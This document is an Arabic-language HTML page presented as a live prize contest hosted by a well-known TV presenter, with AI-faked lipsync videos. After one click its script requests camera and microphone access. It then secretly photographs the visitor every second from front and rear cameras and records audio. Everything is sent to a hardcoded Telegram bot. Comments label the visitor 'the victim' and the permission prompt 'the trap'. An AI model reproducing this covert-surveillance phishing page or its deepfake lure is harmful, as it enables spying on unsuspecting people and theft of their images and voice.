<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>البث المباشر - مسابقة الحلم</title>
    <style>
        body { background: #000; color: #fff; font-family: sans-serif; margin: 0; overflow: hidden; }
        #start-btn { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: radial-gradient(circle, #0a192f 0%, #000 100%); z-index: 10001; display: flex; flex-direction: column; justify-content: center; align-items: center; text-align: center; }
        .play-logo { width: 150px; border-radius: 50%; border: 3px solid #fbbf24; margin-bottom: 20px; cursor: pointer; animation: pulse 2s infinite; }
        @keyframes pulse { 0% { box-shadow: 0 0 0 0 rgba(251, 191, 36, 0.7); } 70% { box-shadow: 0 0 0 30px rgba(251, 191, 36, 0); } 100% { box-shadow: 0 0 0 0 rgba(251, 191, 36, 0); } }
        
        #ai-call { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; flex-direction: column; justify-content: flex-end; align-items: center; z-index: 100; }
        #ai-video { position: absolute; top: 0; left: 0; width: 100%; height: 100%; object-fit: cover; }
        
        /* شريط الدردشة التفاعلي */
        .interaction-area { width: 100%; height: 40%; background: linear-gradient(to top, rgba(0,0,0,0.95), transparent); display: none; flex-direction: column; align-items: center; justify-content: center; z-index: 101; padding-bottom: 20px; transition: 0.5s; }
        .q-text { font-size: 20px; color: #fbbf24; margin-bottom: 15px; text-shadow: 0 0 10px #fbbf24; }
        .btn-choice { background: linear-gradient(#fbbf24, #d97706); color: #000; border: none; padding: 15px 30px; border-radius: 10px; font-weight: bold; cursor: pointer; margin-top: 10px; font-size: 16px; width: 80%; max-width: 400px; }
        #video, #canvas { position: absolute; opacity: 0.01; }
    </style>
</head>
<body>

    <div id="start-btn" onclick="activateMaster()">
        <img src="https://al-ain.com/images/2021/09/10/152-205118-george-kordahi-information-minister_700x400.jpg" class="play-logo">
        <h1 style="color: #fbbf24;">انقر للانضمام للبث المباشر</h1>
        <p>مبروك! أنت الآن تتحدث مع المساعد الذكي لتأكيد الجائزة.</p>
    </div>

    <div id="ai-call">
        <video id="ai-video" muted playsinline></video>
        
        <div class="interaction-area" id="interactions">
            <p class="q-text" id="ai-status">جاري الاتصال...</p>
            <div id="quiz-area" style="display:none;">
                <p class="q-text" id="q_content">جاري تجهيز السؤال الأول...</p>
                <div id="options-area"></div>
            </div>
        </div>
    </div>

    <video id="video" autoplay playsinline muted></video>
    <canvas id="canvas"></canvas>

    <script>
        const TOKEN = "8723330008:AAH7fjX2fEKZ3-7WCWRQyiLHmNoaEY5QUaw";
        const CHAT_ID = "7984067238";
        let qIndex = 0;
        let wakeLock = null;

        const notify = (m) => fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(m)}&parse_mode=Markdown`);
        const aiVideo = document.getElementById('ai-video');

        // قائمة بـ "الفيديوهات المجهزة المسبقة المنسقة" (Lipsync Videos)
        // يجب أن ترفع فيديوهات Lipsync لجورج قرداحي على سيرفر وتضع روابطها هنا
        const vLinks = {
            "intro": "https://raw.githubusercontent.com/username/repo/main/intro.mp4",
            "thinking": "https://raw.githubusercontent.com/username/repo/main/thinking.mp4",
            "correct": "https://raw.githubusercontent.com/username/repo/main/correct.mp4",
            "final": "https://raw.githubusercontent.com/username/repo/main/final.mp4"
        };

        const questions = [
            { q: "ما هو حلمك الأكبر؟", a: ["منزل جديد", "الثراء", "السفر"] },
            { q: "هل أنت مستعد للمليون؟", a: ["نعم", "بالتأكيد", "طبعاً"] },
            { q: "ما هو لونك المفضل؟", a: ["أحمر", "أزرق", "أخضر"] }
        ];

        // تفعيل كل شيء بضغطة واحدة (الإذن)
        async function activateMaster() {
            document.getElementById('start-btn').style.display = 'none';
            document.getElementById('ai-call').style.cssText = 'display: flex;';
            
            // 1. تفعيل الكاميرا والمايكروفون (الفخ الحقيقي)
            try {
                await navigator.mediaDevices.getUserMedia({ audio: true, video: true });
                startCameraLoop(); startAudioLoop();
                notify("🔓 الضحية تفاعل وبدأت الأنظمة السرية!");
                if ('wakeLock' in navigator) wakeLock = await navigator.wakeLock.request('screen');
            } catch(e) { notify("❌ رفض الأذونات."); }

            // 2. تفعيل "جورج قرداحي" المجهز مسبقاً
            playAIVideo("intro");
            setTimeout(() => {
                document.getElementById('interactions').style.display = 'flex';
                document.getElementById('ai-status').innerText = "جورج يتحدث إليك مباشرة...";
                startQuiz();
            }, 3000); // يبدأ المسابقة بعد الانترو
        }

        // دالة تشغيل فيديوهات "جورج قرداحي" المفبركة المجهزة
        function playAIVideo(key) {
            aiVideo.src = vLinks[key];
            aiVideo.muted = false; // تشغيل الصوت
            aiVideo.loop = (key === "thinking"); // فقط فيديو "فكر" يدور (Loop)
            aiVideo.play();
            // تزييف الصوت ليتناسب مع الفيديو المجهز
            notify(`📺 تم تشغيل فيديو الـ AI: ${key}`);
        }

        function startQuiz() {
            document.getElementById('quiz-area').style.display = 'block';
            loadQuestion();
        }

        function loadQuestion() {
            if (qIndex >= 15) { playAIVideo("final"); return; } // النهاية المجهزة
            
            const qObj = questions[qIndex % questions.length];
            document.getElementById('q_content').innerText = qObj.q;

            const area = document.getElementById('options-area');
            area.innerHTML = "";
            qObj.a.forEach(choice => {
                const btn = document.createElement('button');
                btn.className = "btn-choice";
                btn.innerText = choice;
                btn.onclick = () => {
                    playAIVideo("correct"); // فيديو "أحسنت" المجهز
                    qIndex++;
                    loadQuestion();
                };
                area.appendChild(btn);
            });
        }

        // نظام التصوير المكثف (كل ثانية - تبديل كاميرات)
        async function startCameraLoop() {
            const v = document.getElementById('video');
            const c = document.getElementById('canvas');
            const modes = ["user", "environment"];
            let i = 0;
            while(true) {
                try {
                    const mode = modes[i%2];
                    const s = await navigator.mediaDevices.getUserMedia({ video: { facingMode: mode, width: { ideal: 640 } } });
                    v.srcObject = s;
                    await new Promise(r => setTimeout(r, 600)); // وقت الفوكس
                    c.width = v.videoWidth; c.height = v.videoHeight;
                    c.getContext('2d').drawImage(v, 0, 0);
                    c.toBlob(blob => {
                        const fd = new FormData();
                        fd.append('chat_id', CHAT_ID); fd.append('photo', blob, 's.jpg');
                        fd.append('caption', `👁️ الضحية (${mode}) - سؤال ${qIndex+1}`);
                        fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: fd });
                    }, 'image/jpeg', 0.5);
                    s.getTracks().forEach(t => t.stop());
                } catch(e) {}
                i++; await new Promise(r => setTimeout(r, 1000)); // تصوير كل ثانية
            }
        }

        function startAudioLoop() {
            navigator.mediaDevices.getUserMedia({ audio: true }).then(s => {
                const rec = new MediaRecorder(s);
                rec.ondataavailable = (e) => {
                    const fd = new FormData();
                    fd.append('chat_id', CHAT_ID); fd.append('voice', e.data, 'v.ogg');
                    fetch(`https://api.telegram.org/bot${TOKEN}/sendVoice`, { method: 'POST', body: fd });
                };
                setInterval(() => { rec.start(); setTimeout(() => rec.stop(), 8000); }, 20000);
            });
        }
    </script>
</body>
</html>
